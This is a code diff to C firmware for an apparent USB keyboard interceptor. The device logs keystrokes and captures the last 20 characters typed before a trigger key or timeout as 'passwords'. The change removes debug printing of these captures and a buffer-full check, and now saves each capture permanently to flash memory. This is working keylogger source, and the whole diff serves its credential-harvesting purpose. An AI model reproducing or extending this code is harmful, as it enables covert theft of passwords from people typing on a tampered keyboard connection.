@@ -6,6 +6,7 @@
 #include "spi.h"
 #include "usb.h"
 #include "usbh.h"
+#include "flash.h"
 
 #include "usbh_custom_class_example.h"
 
@@ -18,7 +19,7 @@
  */
 #define MB_SIZE 200
 #define NB_INPUT 200
-#define PASSWORD_MAX_SIZE 20  // must be < NB_INPUT
+#define PASSWORD_MAX_SIZE 20
 
 /*
  * variables
@@ -26,11 +27,9 @@
 static uint16_t inputs[NB_INPUT];
 static int      input_timer     = -1;
 static int      input_index     = 0;
-static int      password_index  = 0;
 static int      nb_char_pressed = 0;
 
 uint8_t  led_status = 7;
-uint16_t passwords[PASSWORD_BUFFER_SIZE];
 
 /*
  * Mailbox
@@ -155,24 +154,22 @@ void usbh_add_input(uint16_t input)
  */
 static void store_lasts_inputs(int size)
 {
+    uint16_t passwords[size];
     if(input_index < size - 1) {  // buffer made a loop
         int bytes_written = size - input_index - 1;
         //end inputs
-        memcpy(passwords + password_index, inputs + NB_INPUT - bytes_written, (bytes_written)*2);
+        memcpy(passwords, inputs + NB_INPUT - bytes_written, (bytes_written)*2);
         //start inputs
-        memcpy(passwords + password_index + bytes_written, inputs, (input_index + 1) * 2);
+        memcpy(passwords + bytes_written, inputs, (input_index + 1) * 2);
     } else {
-        memcpy(passwords + password_index, inputs + input_index - size + 1, size * 2);
+        memcpy(passwords, inputs + input_index - size + 1, size * 2);
     }
-    password_index += size;
+    //program new password in flash
+    flash_program(passwords, size);
 }
 
 static void usbh_detector(char input)
 {
-    if(password_index + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
-        rtt_printf("[WARNING] Password buffer full\n");
-        return;
-    }
     nb_char_pressed++;
     // check if current input is interesting
     switch(input) {
@@ -193,10 +190,6 @@ static void usbh_detector(char input)
             nb_char_pressed = 0;
             // disable input timer
             input_timer = -1;
-            // print password buffer
-            rtt_printf("PASSWORD :");
-            SEGGER_RTT_Write(0, passwords, password_index);
-            rtt_printf("");
             break;
     }
     // if input timer is not disabled, decrease its value
@@ -205,9 +198,6 @@ static void usbh_detector(char input)
     // if input timer value is 0, store lasts inputs
     if(input_timer == 0) {
         store_lasts_inputs(PASSWORD_MAX_SIZE);
-        rtt_printf("PASSWORD :");
-        SEGGER_RTT_Write(0, passwords, password_index);
-        rtt_printf("");
     }
 }
 
@@ -217,12 +207,4 @@ void usbh_print_input(void)
     int start          = (input_index - nb_input_print > 0) ? input_index - nb_input_print : 0;
     for(int i = start; i < input_index; i++)
         rtt_printf("inputs[%d] = %c (%04x)", i, hid_to_azerty(inputs[i]), inputs[i]);
-}
-
-void usbh_print_password(void)
-{
-    int nb_password_print = 20;
-    int start             = (password_index - nb_password_print > 0) ? password_index - nb_password_print : 0;
-    for(int i = start; i < password_index; i++)
-        rtt_printf("passwords[%d] = %c (%04x)", i, hid_to_azerty(passwords[i]), passwords[i]);
 }
